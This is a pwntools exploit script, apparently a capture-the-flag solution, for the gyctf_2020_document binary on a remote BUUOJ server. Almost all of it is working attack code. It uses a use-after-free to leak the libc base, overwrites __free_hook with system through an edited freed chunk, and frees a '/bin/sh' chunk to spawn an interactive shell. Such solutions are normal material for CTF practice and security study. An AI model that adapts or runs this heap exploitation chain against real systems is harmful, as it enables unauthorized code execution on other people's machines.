from pwn import *

#context.log_level = 'debug'

#p = process('./gyctf_2020_document')
p = remote('node4.buuoj.cn', 25979)
elf = ELF('gyctf_2020_document')

libc = ELF('libc-2.23.buu.so')

def alloc(fd, content):
    p.sendlineafter(b'choice : \n', b'1')
    p.sendlineafter(b'name\n', fd)
    p.sendlineafter(b'sex\n', str(16).encode())
    p.sendlineafter(b'information\n', content)

def show(index):
    p.sendlineafter(b'choice : \n', b'2')
    p.sendlineafter(b'index : \n', str(index).encode())

def edit(index, content):
    p.sendlineafter(b'choice : \n', b'3')
    p.sendlineafter(b'index : \n', str(index).encode())
    p.sendlineafter(b'sex?\n', b'Y')
    p.sendlineafter(b'information\n', content)

def delete(index):
    p.sendlineafter(b'choice : \n', b'4')
    p.sendlineafter(b'index : \n', str(index).encode())

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

alloc(b'a' * 8, b'a' * 0x70) #0
alloc(b'/bin/sh\x00', b'a' * 0x70) #1

delete(0)
show(0)

libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x68 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

alloc(b'a' * 8, b'a' * 0x70) #2
alloc(b'a' * 8, b'a' * 0x70) #3

edit(0, p64(0) + p64(0x21) + p64(free_hook - 0x10) + p64(0x1) + p64(0) + p64(0x51) + p64(0) * 8)
edit(3, p64(system).ljust(0x70, b'\x00'))

delete(1)
p.interactive()